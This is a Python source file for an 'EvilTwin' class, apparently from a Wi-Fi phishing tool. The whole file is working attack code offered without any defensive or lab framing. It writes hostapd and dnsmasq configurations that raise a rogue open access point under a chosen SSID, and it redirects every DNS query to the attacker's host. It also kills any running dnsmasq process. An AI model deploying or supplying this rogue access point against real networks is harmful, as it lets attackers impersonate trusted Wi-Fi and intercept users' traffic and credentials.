import os
import subprocess
import tempfile
import threading
import time
from typing import Optional


HOSTAPD_CONF = """\
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""

DNSMASQ_CONF = """\
interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1,10.0.0.1
address=/#/10.0.0.1
no-resolv
"""


class EvilTwin:
    def __init__(self, iface: str, ssid: str, channel: int):
        self.iface = iface
        self.ssid = ssid
        self.channel = channel
        self._tmpdir = tempfile.mkdtemp(prefix="iphisher_")
        self._hostapd_proc: Optional[subprocess.Popen] = None
        self._dnsmasq_proc: Optional[subprocess.Popen] = None
        self._running = False

    def start(self) -> bool:
        """Start the fake AP with DHCP/DNS spoofing."""
        if not self._write_configs():
            return False
        if not self._start_hostapd():
            return False
        time.sleep(2)
        if not self._start_dnsmasq():
            self.stop()
            return False
        self._running = True
        return True

    def stop(self) -> None:
        self._running = False
        for proc in [self._hostapd_proc, self._dnsmasq_proc]:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
        try:
            import shutil
            shutil.rmtree(self._tmpdir, ignore_errors=True)
        except Exception:
            pass

    def _write_configs(self) -> bool:
        try:
            hconf = os.path.join(self._tmpdir, "hostapd.conf")
            dconf = os.path.join(self._tmpdir, "dnsmasq.conf")
            with open(hconf, "w") as f:
                f.write(HOSTAPD_CONF.format(
                    iface=self.iface, ssid=self.ssid, channel=self.channel
                ))
            with open(dconf, "w") as f:
                f.write(DNSMASQ_CONF.format(iface=self.iface))
            return True
        except Exception:
            return False

    def _start_hostapd(self) -> bool:
        hconf = os.path.join(self._tmpdir, "hostapd.conf")
        log_path = os.path.join(self._tmpdir, "hostapd.log")
        try:
            with open(log_path, "w") as log:
                self._hostapd_proc = subprocess.Popen(
                    ["hostapd", hconf],
                    stdout=log, stderr=log,
                )
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                return False
            return True
        except Exception:
            return False

    def _start_dnsmasq(self) -> bool:
        dconf = os.path.join(self._tmpdir, "dnsmasq.conf")
        log_path = os.path.join(self._tmpdir, "dnsmasq.log")
        try:
            subprocess.run(["pkill", "-f", "dnsmasq"], capture_output=True)
            time.sleep(0.5)
            with open(log_path, "w") as log:
                self._dnsmasq_proc = subprocess.Popen(
                    ["dnsmasq", "-C", dconf, "--no-daemon", "--pid-file"],
                    stdout=log, stderr=log,
                )
            time.sleep(1)
            if self._dnsmasq_proc.poll() is not None:
                return False
            return True
        except Exception:
            return False

    @property
    def is_running(self) -> bool:
        if not self._running:
            return False
        if self._hostapd_proc and self._hostapd_proc.poll() is not None:
            return False
        return True
